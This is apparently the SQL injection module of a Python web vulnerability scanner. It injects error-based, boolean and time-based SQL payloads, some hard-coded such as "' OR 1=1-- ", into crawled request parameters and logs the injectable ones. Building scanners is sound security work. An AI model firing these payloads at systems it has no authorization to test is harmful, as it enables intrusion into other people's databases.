# components/attack/sqli.py

import time
import asyncio
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from components.attack.base_attack import BaseAttack
from components.main.logger import logger
from components.parsers.html import HTML
from components.web.request import Request

class SQLInjection(BaseAttack):
    name = 'sqli'

    BOOLEAN_PAYLOAD_PAIRS = [
        # simple numeric checks
        ("' OR 1=1-- ",   "' OR 1=2-- "),
        ("' OR 1=1# ",    "' OR 1=2# "),
        ("' OR 1=1/*",    "' OR 1=2/*"),

        # quoted string checks
        ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
        ('" OR "1"="1"-- ',  '" OR "1"="2"-- '),

        # database-specific tweaks
        ("' OR EXISTS(SELECT 1)-- ", "' OR EXISTS(SELECT 0)-- "),
        ("' OR SLEEP(0)=0-- ",       "' OR SLEEP(0)=1-- "),
    ]
    
    UNION_REGEX = re.compile(r"union(?:.|\s)*select", re.IGNORECASE)

    def __init__(self, crawler, crawler_config):
        super().__init__(crawler, crawler_config)
        self.crawler.context = None
        self.payloads = self._load_payload_files()
        self.error_regexes = self._load_error_regexes()

    def _load_payload_files(self):
        base = Path(__file__).parent.parent / 'payloads' / 'sqli'
        mapping = {
            'error': 'sqli_error.txt',
            'time': 'sqli_time.txt',
            'union': 'sqli_union.txt',
            'auth_bypass': 'sqli_auth_bypass.txt',
            'small' : 'sqli_small.txt',
        }
        out = {}
        for kind, fname in mapping.items():
            path = base / fname
            try:
                with open(path, encoding='utf-8') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                out[kind] = lines
            except Exception as e:
                logger.error(f"[sqli] cannot load payload file {path}: {e}")
                out[kind] = []
        return out

    def _load_error_regexes(self):

        xml_path = Path(__file__).parent.parent / 'payloads' / 'sqli' / 'database_errors.xml'
        db_regex_map = {}

        if not xml_path.exists():
            logger.error(f"[sqli] error‐regex file not found: {xml_path}")
            return db_regex_map

        try:
            tree = ET.parse(xml_path)
            root = tree.getroot()
            # iterate over each <dbms value="...">
            for dbms in root.findall('.//dbms'):
                db_name = dbms.get('value')
                if not db_name:
                    continue

                regex_list = []
                for err in dbms.findall('error'):
                    pat = err.get('regexp')
                    if not pat:
                        continue
                    try:
                        regex_list.append(re.compile(pat, re.IGNORECASE))
                    except re.error as rex:
                        logger.error(f"[sqli] invalid regex {pat} for {db_name} in {xml_path}: {rex}")

                if regex_list:
                    db_regex_map[db_name] = regex_list

        except Exception as e:
            logger.error(f"[sqli] failed to parse {xml_path}: {e}")

        return db_regex_map


    async def run(self, request, response):
        if not request.get_params and not request.post_params:
            return

        method = request.method.upper()
        params = request.get_params if method == 'GET' else request.post_params

        sem = asyncio.Semaphore(10)

        # 1) Error-based tests
        async def try_error(param, payload):
            async with sem:
                #logger.debug(f"{request} Testing {param} (error) with payload {payload!r}")
                return await self._test_error(request, param, payload)

        error_tasks = [
            asyncio.create_task(try_error(param, payload))
            for payload in self.payloads['error']
            for param in params
        ]

        done, pending = await asyncio.wait(error_tasks, return_when=asyncio.FIRST_COMPLETED)
        for task in pending:
            task.cancel()
        for task in done:
            try:
                if task.result():
                    return
            except asyncio.CancelledError:
                continue

        async def try_boolean(param):
            async with sem:
                #logger.debug(f"{request} Testing {param} with boolean payloads")
                return await self._test_boolean(request, param)

        bool_tasks = [
            asyncio.create_task(try_boolean(param))
            for param in params
        ]

        done, pending = await asyncio.wait(bool_tasks, return_when=asyncio.FIRST_COMPLETED)
        for task in pending:
            task.cancel()
        for task in done:
            try:
                if task.result():
                    return
            except asyncio.CancelledError:
                continue

        async def try_time(param, payload):
            async with sem:
                #logger.debug(f"{request} Testing {param} (time) with payload {payload!r}")
                return await self._test_time(request, param, payload)

        time_tasks = [
            asyncio.create_task(try_time(param, payload))
            for payload in self.payloads['time']
            for param in params
        ]

        done, pending = await asyncio.wait(time_tasks, return_when=asyncio.FIRST_COMPLETED)
        for task in pending:
            task.cancel()
        for task in done:
            try:
                if task.result():
                    return
            except asyncio.CancelledError:
                continue


    def _build_request(self, request, param, payload):
        parts = urlparse(request.url)
        
        if request.method == 'GET':
            qs = dict(parse_qsl(parts.query))
            qs[param] = qs.get(param, '') + payload
            
            new_qs = urlencode(qs, doseq=True)
            new_url = urlunparse(parts._replace(query=new_qs))
            
            return Request(new_url, method='GET')
        
        else:
            body = dict(request.post_params or {})
            body[param] = body.get(param, '') + payload
            
            return Request(request.url, method='POST', post_params=body)
        
    def _find_error(self, text):
        
        text_small = text[:20000]
        for dbms, regexes in self.error_regexes.items():
            for regex in regexes:
                if regex.search(text_small):
                    return f"SQL Injection {dbms}"
        return ''
        
    async def _false_positive(self, request):
        try:
            resp = await self.crawler.send(request, timeout = 3)
            
        except Exception:
            pass
        
        else:
            if self._find_error(resp.text):
                return True
            
        return False

    async def _test_error(self, request, param, payload):
        
        attack_request = self._build_request(request, param, payload)
        
        try:
            resp = await self.crawler.send(attack_request, timeout = 1)
            text = resp.text
            
        except Exception as e:
            logger.error(f"[sqli] request failed for {attack_request.url}: {e}")
            return False
        

        else:
            vulnerability = self._find_error(text)

            if vulnerability and not await self._false_positive(request):
                logger.critical(f'SQL Injection Error Based | {attack_request.url} with vulnerable parameter {param} using payload {payload}')
                
                logger.log("VULN", f'Target: {attack_request.url} {attack_request.method}')
                logger.log("VULN", f'Parameter: {param}')
                logger.log("VULN", f'Payload: {payload}')
                logger.log("VULN", f'Possbile CVE: {vulnerability} {self.search_cve(vulnerability)['description']}')
                print()
                
                return True
                
            return False        
            
    async def _test_boolean(self, request, param) -> bool:
 
        for true_pl, false_pl in self.BOOLEAN_PAYLOAD_PAIRS:

            true_req  = self._build_request(request, param, true_pl)
            false_req = self._build_request(request, param, false_pl)

            try:
                resp_true  = await self.crawler.send(true_req,  timeout=3)
                resp_false = await self.crawler.send(false_req, timeout=3)
                
            except Exception as e:
                logger.error(f"[sqli][boolean] network error for {param}: {e}")
                continue

            if resp_true.status_code != resp_false.status_code:
                logger.critical(f"Boolean SQLi detected by status code | {true_req.url} param={param}")
                break


            len_true  = len(resp_true.text or "")
            len_false = len(resp_false.text or "")
            
            if abs(len_true - len_false) > 20:  # tweak threshold as needed
                logger.critical(f"Boolean SQLi detected | {true_req.url} param={param} Δ={abs(len_true-len_false)}")
         
                logger.log("VULN", f"Parameter: {param}")
                logger.log("VULN", f"True payload:  {true_pl}")
                logger.log("VULN", f"False payload: {false_pl}")
                print()
                
                return True

        return False



    async def _test_time(self, request, param, payload, threshold: float = 2.0) -> bool:

        attack_req = self._build_request(request, param, payload)
        start = time.time()

        try:
            await self.crawler.send(attack_req, timeout=threshold + 1)
            elapsed = time.time() - start
            
        except Exception:
            elapsed = time.time() - start

        if elapsed > threshold:
            logger.critical(f"Time-based SQLi detected | {attack_req.url} param={param} (delay ≈ {elapsed:.1f}s)")
            logger.log("VULN", f"Parameter: {param}")
            logger.log("VULN", f"Payload:   {payload}")
            logger.log("VULN", f"Delay ms:  {int(elapsed * 1000)}")
            print()
            
            return True

        return False